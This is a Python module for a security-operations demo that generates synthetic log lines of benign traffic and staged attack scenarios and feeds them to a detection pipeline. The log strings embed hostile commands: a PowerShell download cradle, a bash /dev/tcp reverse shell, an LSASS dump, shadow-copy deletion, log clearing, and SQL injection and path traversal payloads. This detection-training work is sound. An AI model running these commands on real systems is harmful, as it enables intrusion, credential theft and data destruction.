"""
Live telemetry simulator — makes the platform behave like a SOC watching a real network.

* Background traffic: a steady stream of benign activity from a fictional company network
  (logons, web requests, DNS, firewall allows, backups) plus opportunistic internet noise
  (port scans and SSH brute force) from IP addresses listed on real threat-intel blocklists.
* Attack scenarios: presenter-launched, multi-stage intrusions that unfold step by step so an
  audience can watch detection, campaign correlation and SOAR response happen live.

Every generated line goes through the real analysis pipeline. Attacker addresses are taken
from the IPsum / Feodo Tracker feeds already stored in the database, so geolocation, threat-intel
matches and the threat map are genuine. No traffic is ever sent to those addresses — only log
lines describing them are generated locally.
"""
from __future__ import annotations

import logging
import random
import threading
import time
from datetime import datetime
from typing import Callable, Dict, List, Optional

from sqlalchemy import func

from core.events import publish
from models.database import SessionLocal
from models.db_models import ThreatIntelEntry
from services.pipeline import process_log

logger = logging.getLogger("threatlens.simulator")

SOURCE_TRAFFIC = "live_traffic"
SOURCE_SCENARIO = "attack_simulation"

# ── The fictional organisation being monitored ──────────────────────────────
USERS = ["j.smith", "a.khan", "m.garcia", "s.chen", "r.patel", "l.novak", "d.okafor", "e.rossi"]
WORKSTATIONS = [("WS-FIN-07", "10.20.3.44"), ("WS-HR-02", "10.20.3.51"), ("WS-ENG-14", "10.20.4.18"),
                ("WS-ENG-22", "10.20.4.26"), ("WS-SALES-05", "10.20.5.12"), ("LT-EXEC-01", "10.20.6.8")]
SERVERS = {"web": ("WEB-01", "10.20.10.5"), "db": ("SRV-DB-01", "10.20.10.21"), "dc": ("DC01", "10.20.10.2"),
           "file": ("SRV-FILE-02", "10.20.10.33"), "vpn": ("VPN-GW", "10.20.0.1")}
SAAS_DESTS = ["13.107.42.14", "142.250.183.14", "52.96.165.34", "151.101.1.140", "104.18.32.7"]
DOMAINS = ["login.microsoftonline.com", "outlook.office365.com", "github.com", "slack.com", "api.stripe.com",
           "docs.google.com", "zoom.us", "updates.example-corp.com"]
WEB_PATHS = ["/", "/api/orders", "/api/products?page=2", "/static/app.js", "/login", "/api/cart", "/health",
             "/api/users/me", "/images/logo.png", "/checkout"]
FALLBACK_ATTACKERS = ["198.51.100.23", "203.0.113.45", "192.0.2.77", "198.51.100.91", "203.0.113.9"]

_TRAFFIC_RATES = {"low": 4.0, "normal": 2.0, "high": 0.8}  # mean seconds between benign events


def _ts() -> str:
    return datetime.utcnow().strftime("%b %d %H:%M:%S")


def _iso() -> str:
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")


def _pid() -> int:
    return random.randint(1200, 65000)


def _attacker_pool(limit: int = 40) -> List[str]:
    """Real known-malicious IPs from the threat-intel feeds (falls back to documentation ranges)."""
    db = SessionLocal()
    try:
        rows = (
            db.query(ThreatIntelEntry.ioc_value)
            .filter(ThreatIntelEntry.ioc_type == "ip", ThreatIntelEntry.source.in_(["IPSUM", "FEODO_TRACKER"]))
            .order_by(func.random())
            .limit(limit)
            .all()
        )
        ips = [r[0] for r in rows if r[0]]
    except Exception:
        ips = []
    finally:
        db.close()
    return ips or list(FALLBACK_ATTACKERS)


# ── Benign background activity ──────────────────────────────────────────────
def _benign_event() -> str:
    user = random.choice(USERS)
    host, ip = random.choice(WORKSTATIONS)
    kind = random.choices(
        ["win_logon", "web", "dns", "fw_allow", "ssh_deploy", "cron", "vpn"],
        weights=[22, 28, 18, 16, 6, 4, 6],
    )[0]
    if kind == "win_logon":
        return (f"{_iso()} WinEventLog:Security EventID=4624 Computer={host} Account Name: {user} "
                f"Logon Type: {random.choice([2, 3, 11])} Source Network Address: {ip} status=Success")
    if kind == "web":
        path = random.choice(WEB_PATHS)
        return (f'{ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" '
                f'{random.choice([200, 200, 200, 304])} {random.randint(300, 48000)} "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"')
    if kind == "dns":
        return f"{_ts()} dns-01 dnsmasq[{_pid()}]: query[A] {random.choice(DOMAINS)} from {ip}"
    if kind == "fw_allow":
        return (f"{_ts()} edge-fw01 firewall ALLOW src={ip} dst={random.choice(SAAS_DESTS)} dport=443 "
                f"proto=TCP bytes={random.randint(1200, 900000)}")
    if kind == "ssh_deploy":
        web, web_ip = SERVERS["web"]
        return f"{_ts()} {web} sshd[{_pid()}]: Accepted publickey for deploy from 10.20.20.5 port {random.randint(40000, 60000)} ssh2"
    if kind == "cron":
        return f"{_ts()} SRV-DB-01 CRON[{_pid()}]: (root) CMD (/usr/local/bin/pg_backup.sh)"
    return (f"{_ts()} VPN-GW openvpn[{_pid()}]: {user}/{random.choice(['49.36.', '103.21.', '27.61.'])}"
            f"{random.randint(1, 250)}.{random.randint(1, 250)} MULTI: primary virtual IP for {user}: 10.8.0.{random.randint(2, 250)}")


def _internet_noise(attacker: str) -> List[str]:
    """Opportunistic attacks every internet-facing company sees."""
    web, web_ip = SERVERS["web"]
    kind = random.choice(["scan", "scan", "ssh_bruteforce", "web_probe"])
    if kind == "scan":
        port = random.choice([22, 23, 445, 1433, 3306, 3389, 5900, 6379])
        return [f"{_ts()} edge-fw01 kernel: [DROP] IN=eth0 SRC={attacker} DST=203.0.113.10 PROTO=TCP DPT={port} BLOCKED"]
    if kind == "ssh_bruteforce":
        user = random.choice(["root", "admin", "ubuntu", "oracle", "test"])
        return [f"{_ts()} {web} sshd[{_pid()}]: Failed password for invalid user {user} from {attacker} port {random.randint(30000, 65000)} ssh2"
                for _ in range(random.randint(2, 4))]
    path = random.choice(["/.env", "/wp-login.php", "/.git/config", "/admin/config.php", "/phpmyadmin/"])
    return [f'{attacker} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"']


# ── Attack scenarios ────────────────────────────────────────────────────────
def _scenario_ransomware(atk: List[str]) -> List[Dict]:
    a = atk[0]
    fs, fs_ip = SERVERS["file"]
    dc, _ = SERVERS["dc"]
    return [
        {"label": "Internet-wide port scan hits the perimeter", "stage": "Reconnaissance", "delay": 2,
         "logs": [f"{_ts()} edge-fw01 kernel: [DROP] IN=eth0 SRC={a} DST=203.0.113.10 PROTO=TCP DPT={p} BLOCKED" for p in (3389, 445, 22)]},
        {"label": "RDP password brute force against the file server", "stage": "Credential Access", "delay": 8,
         "logs": [f"{_iso()} WinEventLog:Security EventID=4625 Computer={fs} Account Name: administrator Logon Type: 10 "
                  f"Source Network Address: {a} status=Failed reason=Unknown user name or bad password" for _ in range(6)]},
        {"label": "Attacker logs in with a guessed password", "stage": "Initial Access", "delay": 8,
         "logs": [f"{_iso()} WinEventLog:Security EventID=4624 Computer={fs} Account Name: administrator Logon Type: 10 "
                  f"Source Network Address: {a} status=Success"]},
        {"label": "Encoded PowerShell downloads a second-stage payload", "stage": "Execution", "delay": 8,
         "logs": [f'{_iso()} WinEventLog:Microsoft-Windows-PowerShell EventID=4104 Computer={fs} user=administrator '
                  f'Source Network Address: {a} ScriptBlock: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA '
                  f'IEX (New-Object Net.WebClient).DownloadString("http://{a}/stage2.ps1")']},
        {"label": "LSASS memory dumped to steal credentials", "stage": "Credential Access", "delay": 8,
         "logs": [f'{_iso()} WinEventLog:Security EventID=4688 Computer={fs} Account Name: administrator '
                  f'Source Network Address: {a} Process created: "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp"']},
        {"label": "Lateral movement to the domain controller with PsExec", "stage": "Lateral Movement", "delay": 8,
         "logs": [f'{_iso()} WinEventLog:System EventID=7045 Computer={dc} Service Name: PSEXESVC '
                  f'Source Network Address: {a} Service File Name: %SystemRoot%\\PSEXESVC.exe user=administrator']},
        {"label": "Scheduled task created for persistence", "stage": "Persistence", "delay": 7,
         "logs": [f'{_iso()} WinEventLog:Security EventID=4698 Computer={dc} Source Network Address: {a} '
                  f'Process created: "schtasks /create /tn MicrosoftEdgeUpdate /tr C:\\ProgramData\\svc.exe /sc onstart /ru SYSTEM"']},
        {"label": "Security event log cleared to hide tracks", "stage": "Defense Evasion", "delay": 7,
         "logs": [f"{_iso()} WinEventLog:Security EventID=1102 Computer={dc} The audit log was cleared. "
                  f"Subject: administrator Source Network Address: {a}"]},
        {"label": "Volume shadow copies deleted, files encrypted", "stage": "Impact", "delay": 8,
         "logs": [f'{_iso()} WinEventLog:Security EventID=4688 Computer={fs} Source Network Address: {a} '
                  f'Process created: "cmd.exe /c vssadmin.exe delete shadows /all /quiet & wbadmin delete catalog -quiet"',
                  f"{_iso()} {fs} FileAudit: 18,402 files encrypted and renamed to *.lockbit — ransom note README_DECRYPT.txt "
                  f"dropped in 1,206 folders Source Network Address: {a}"]},
    ]


def _scenario_credential_stuffing(atk: List[str]) -> List[Dict]:
    vpn, _ = SERVERS["vpn"]
    victim = "j.smith"
    sprayers = atk[1:7] if len(atk) >= 7 else atk[:6]
    winner = atk[0]
    steps = [
        {"label": f"Botnet of {len(sprayers)} IPs sprays leaked passwords at the VPN", "stage": "Credential Access", "delay": 2,
         "logs": [f"{_ts()} {vpn} openvpn[{_pid()}]: {ip}:{random.randint(30000, 65000)} TLS Auth Error: Auth Username/Password "
                  f"verification failed for user={victim} status=Failed" for ip in sprayers for _ in range(2)]},
        {"label": "One address keeps hammering the same account", "stage": "Credential Access", "delay": 10,
         "logs": [f"{_ts()} {vpn} openvpn[{_pid()}]: {winner}:{random.randint(30000, 65000)} TLS Auth Error: Auth Username/Password "
                  f"verification failed for user={victim} status=Failed" for _ in range(4)]},
        {"label": "Correlation engine connects the distributed attack", "stage": "Credential Access", "delay": 6, "correlate": True,
         "logs": []},
        {"label": "Attacker gets in with a valid leaked password", "stage": "Initial Access", "delay": 8,
         "logs": [f"{_ts()} {vpn} openvpn[{_pid()}]: {winner}:{random.randint(30000, 65000)} user={victim} "
                  f"authentication succeeded status=Success Peer Connection Initiated"]},
        {"label": "Compromised session pulls the customer database", "stage": "Exfiltration", "delay": 8,
         "logs": [f"{_ts()} edge-fw01 firewall ALLOW src=10.8.0.77 dst={winner} dport=443 proto=TCP user={victim} "
                  f"bytes=1873829440 app=curl upload transfer"]},
    ]
    return steps


def _scenario_web_attack(atk: List[str]) -> List[Dict]:
    a = atk[0]
    web, web_ip = SERVERS["web"]
    now = lambda: datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")  # noqa: E731
    return [
        {"label": "Automated scanner maps the web application", "stage": "Reconnaissance", "delay": 2,
         "logs": [f'{a} - - [{now()}] "GET {p} HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:00{i})"'
                  for i, p in enumerate(["/admin/", "/backup.zip", "/.git/HEAD"], start=1)]},
        {"label": "Path traversal attempts to read system files", "stage": "Reconnaissance", "delay": 7,
         "logs": [f'{a} - - [{now()}] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 0 "-" "curl/8.4.0"']},
        {"label": "SQL injection against the login form", "stage": "Initial Access", "delay": 7,
         "logs": [f'{a} - - [{now()}] "GET /api/products?id=1%27%20UNION%20ALL%20SELECT%20username,password_hash%20FROM%20users--%20- HTTP/1.1" 200 4120 "-" "sqlmap/1.8.2#stable"',
                  f'{a} - - [{now()}] "GET /api/products?id=1%20AND%208213%3D8213 HTTP/1.1" 200 3901 "-" "sqlmap/1.8.2#stable"']},
        {"label": "Web shell uploaded through the image endpoint", "stage": "Persistence", "delay": 8,
         "logs": [f'{a} - - [{now()}] "POST /uploads/shell.php HTTP/1.1" 201 87 "-" "python-requests/2.31"']},
        {"label": "Web server opens a reverse shell to the attacker", "stage": "Command and Control", "delay": 8,
         "logs": [f"{_ts()} {web} auditd[{_pid()}]: type=EXECVE www-data executed 'bash -i >& /dev/tcp/{a}/4444 0>&1' "
                  f"reverse shell callback src_ip={web_ip} dst={a}"]},
        {"label": "Database dumped and sent out over the C2 channel", "stage": "Exfiltration", "delay": 8,
         "logs": [f"{_ts()} edge-fw01 firewall ALLOW src={web_ip} dst={a} dport=4444 proto=TCP bytes=734003200 "
                  f"app=reverse-shell upload transfer"]},
    ]


def _scenario_insider(atk: List[str]) -> List[Dict]:
    user = "d.okafor"
    host, ip = WORKSTATIONS[3]
    db_host, db_ip = SERVERS["db"]
    return [
        {"label": f"{user} attempts sudo on the database server after hours", "stage": "Privilege Escalation", "delay": 2,
         "logs": [f"{_ts()} {db_host} sudo: pam_unix(sudo:auth): authentication failure; logname={user} user={user} "
                  f"rhost={ip} tty=/dev/pts/3 ; privilege escalation attempt status=Failed" for _ in range(2)]},
        {"label": "Phishing attachment launches a macro on the user's laptop", "stage": "Execution", "delay": 8,
         "logs": [f'{_iso()} WinEventLog:Security EventID=4688 Computer={host} Account Name: {user} Source Network Address: {ip} '
                  f'Process created: WINWORD.EXE spawned "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A"']},
        {"label": "Persistence added to the user's startup", "stage": "Persistence", "delay": 7,
         "logs": [f'{_iso()} WinEventLog:Security EventID=4657 Computer={host} Account Name: {user} Source Network Address: {ip} '
                  f'registry value set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync = C:\\Users\\Public\\sync.exe']},
        {"label": "4.2 GB of design files uploaded to a personal cloud drive", "stage": "Exfiltration", "delay": 8,
         "logs": [f"{_ts()} {host} rclone[{_pid()}]: user={user} src_ip={ip} copy \\\\SRV-FILE-02\\engineering mega:backup "
                  f"upload transfer complete bytes=4509715660 dst=31.216.145.5"]},
        {"label": "Local event log wiped", "stage": "Defense Evasion", "delay": 7,
         "logs": [f'{_iso()} WinEventLog:Security EventID=4688 Computer={host} Account Name: {user} Source Network Address: {ip} '
                  f'Process created: "wevtutil.exe cl Security"']},
    ]


SCENARIOS: Dict[str, Dict] = {
    "ransomware": {
        "name": "Ransomware intrusion",
        "summary": "RDP brute force from a known-bad IP → credential theft → lateral movement to the domain controller → backups deleted and files encrypted.",
        "builder": _scenario_ransomware, "attackers": 1,
        "techniques": ["T1046", "T1110", "T1059", "T1003", "T1021", "T1053", "T1070", "T1486"],
    },
    "credential_stuffing": {
        "name": "Credential stuffing → account takeover",
        "summary": "A botnet sprays leaked passwords at the VPN; one attempt succeeds and the session exfiltrates data.",
        "builder": _scenario_credential_stuffing, "attackers": 7,
        "techniques": ["T1110", "T1110.004", "T1041"],
    },
    "web_attack": {
        "name": "Web application breach",
        "summary": "Scanner reconnaissance, path traversal and SQL injection lead to a web shell, a reverse shell and data theft.",
        "builder": _scenario_web_attack, "attackers": 1,
        "techniques": ["T1595", "T1190", "T1505", "T1071", "T1041"],
    },
    "insider": {
        "name": "Insider data theft",
        "summary": "An employee escalates privileges, runs a macro, persists, uploads 4.2 GB to a personal cloud and wipes logs.",
        "builder": _scenario_insider, "attackers": 1,
        "techniques": ["T1068", "T1204", "T1059", "T1053", "T1041", "T1070"],
    },
}


# ── Engine ──────────────────────────────────────────────────────────────────
class LiveSimulator:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._traffic_thread: Optional[threading.Thread] = None
        self._traffic_stop = threading.Event()
        self._scenario_thread: Optional[threading.Thread] = None
        self._scenario_stop = threading.Event()
        self.traffic_rate = "normal"
        self.traffic_started_at: Optional[str] = None
        self.events_generated = 0
        self.scenario: Optional[Dict] = None
        self.history: List[Dict] = []
        self._noise_pool: List[str] = []

    # helpers -----------------------------------------------------------------
    def _ingest(self, lines: List[str], source: str, extra: Optional[Dict] = None) -> List[Dict]:
        db = SessionLocal()
        detections = []
        try:
            for line in lines:
                with db.begin_nested():
                    result = process_log(db, line, source=source, summary_extra=extra)
                self.events_generated += 1
                det = result["detection_result"]
                if det.get("threat_detected"):
                    detections.append({
                        "threat": det["threat_detected"],
                        "risk_level": result["risk_assessment"]["risk_level"],
                        "incident_id": result["incident_id"],
                        "multi_stage": det.get("multi_stage_correlation"),
                    })
            db.commit()
        except Exception:
            db.rollback()
            logger.exception("Simulator failed to ingest a batch")
        finally:
            db.close()
        return detections

    # background traffic ------------------------------------------------------
    def start_traffic(self, rate: str = "normal") -> Dict:
        if rate not in _TRAFFIC_RATES:
            raise ValueError(f"rate must be one of {', '.join(_TRAFFIC_RATES)}")
        with self._lock:
            self.traffic_rate = rate
            if self._traffic_thread and self._traffic_thread.is_alive():
                return self.status()
            self._traffic_stop.clear()
            self.traffic_started_at = datetime.utcnow().isoformat()
            self._traffic_thread = threading.Thread(target=self._traffic_loop, daemon=True, name="live-traffic")
            self._traffic_thread.start()
        publish("simulator", {"traffic": "started", "rate": rate})
        logger.info("Live traffic started (%s)", rate)
        return self.status()

    def stop_traffic(self) -> Dict:
        self._traffic_stop.set()
        self.traffic_started_at = None
        publish("simulator", {"traffic": "stopped"})
        return self.status()

    def _traffic_loop(self) -> None:
        next_noise = time.monotonic() + random.uniform(8, 15)
        while not self._traffic_stop.is_set():
            mean = _TRAFFIC_RATES.get(self.traffic_rate, 2.0)
            batch = [_benign_event() for _ in range(random.choice([1, 1, 2]))]
            if time.monotonic() >= next_noise:
                if not self._noise_pool or random.random() < 0.15:
                    self._noise_pool = _attacker_pool(25)
                batch += _internet_noise(random.choice(self._noise_pool))
                next_noise = time.monotonic() + random.uniform(15, 35) * mean / 2
            self._ingest(batch, SOURCE_TRAFFIC)
            self._traffic_stop.wait(random.uniform(mean * 0.5, mean * 1.5))

    # scenarios ---------------------------------------------------------------
    def launch(self, scenario_id: str, speed: float = 1.0, launched_by: str = "system") -> Dict:
        if scenario_id not in SCENARIOS:
            raise KeyError(scenario_id)
        with self._lock:
            if self._scenario_thread and self._scenario_thread.is_alive():
                raise RuntimeError("Another attack scenario is still running")
            meta = SCENARIOS[scenario_id]
            attackers = _attacker_pool(max(meta["attackers"], 1) + 2)
            random.shuffle(attackers)
            steps = meta["builder"](attackers)
            self.scenario = {
                "id": scenario_id,
                "name": meta["name"],
                "attacker_ip": attackers[0],
                "started_at": datetime.utcnow().isoformat(),
                "finished_at": None,
                "status": "running",
                "speed": speed,
                "launched_by": launched_by,
                "steps": [{"label": s["label"], "stage": s["stage"], "status": "pending", "detections": []} for s in steps],
                "incident_ids": [],
            }
            self._scenario_stop.clear()
            self._scenario_thread = threading.Thread(
                target=self._run_scenario, args=(steps, max(0.25, min(speed, 8.0))), daemon=True, name=f"scenario-{scenario_id}"
            )
            self._scenario_thread.start()
        publish("scenario", {"event": "started", "scenario": self._public_scenario()})
        logger.info("Attack scenario %s launched by %s (attacker %s)", scenario_id, launched_by, attackers[0])
        return self._public_scenario()

    def stop_scenario(self) -> Dict:
        self._scenario_stop.set()
        return self.status()

    def _run_scenario(self, steps: List[Dict], speed: float) -> None:
        from services.correlation_engine import run_correlation_sweep

        state = self.scenario
        for index, step in enumerate(steps):
            if self._scenario_stop.wait(step["delay"] / speed):
                state["status"] = "stopped"
                break
            state["steps"][index]["status"] = "running"
            publish("scenario", {"event": "step", "index": index, "scenario": self._public_scenario()})
            detections = self._ingest(step["logs"], SOURCE_SCENARIO, {"scenario": state["id"]}) if step["logs"] else []
            if step.get("correlate"):
                findings = run_correlation_sweep()
                detections += [{"threat": f, "risk_level": "CRITICAL", "incident_id": None} for f in findings]
            state["steps"][index].update({"status": "done", "detections": detections})
            state["incident_ids"] = sorted({d["incident_id"] for s in state["steps"] for d in s["detections"] if d.get("incident_id")})
            publish("scenario", {"event": "step", "index": index, "scenario": self._public_scenario()})
        else:
            state["status"] = "completed"
        state["finished_at"] = datetime.utcnow().isoformat()
        self.history = ([{k: state[k] for k in ("id", "name", "attacker_ip", "started_at", "finished_at", "status")}] + self.history)[:10]
        publish("scenario", {"event": "finished", "scenario": self._public_scenario()})

    # status ------------------------------------------------------------------
    def _public_scenario(self) -> Optional[Dict]:
        return dict(self.scenario) if self.scenario else None

    def status(self) -> Dict:
        traffic_alive = bool(self._traffic_thread and self._traffic_thread.is_alive() and not self._traffic_stop.is_set())
        scenario_alive = bool(self._scenario_thread and self._scenario_thread.is_alive())
        return {
            "traffic": {"running": traffic_alive, "rate": self.traffic_rate, "started_at": self.traffic_started_at,
                        "rates": list(_TRAFFIC_RATES)},
            "events_generated": self.events_generated,
            "scenario_running": scenario_alive,
            "scenario": self._public_scenario(),
            "history": self.history,
            "catalog": [
                {"id": key, "name": meta["name"], "summary": meta["summary"], "techniques": meta["techniques"],
                 "steps": len(meta["builder"](list(FALLBACK_ATTACKERS) * 2))}
                for key, meta in SCENARIOS.items()
            ],
        }


simulator = LiveSimulator()


def run_scenario_sync(scenario_id: str) -> Dict:
    """Run a scenario to completion without delays (used by tests and scripts)."""
    meta = SCENARIOS[scenario_id]
    attackers = _attacker_pool(meta["attackers"] + 2)
    detections = []
    for step in meta["builder"](attackers):
        detections += simulator._ingest(step["logs"], SOURCE_SCENARIO, {"scenario": scenario_id}) if step["logs"] else []
        if step.get("correlate"):
            from services.correlation_engine import run_correlation_sweep
            run_correlation_sweep()
    return {"scenario": scenario_id, "detections": detections}
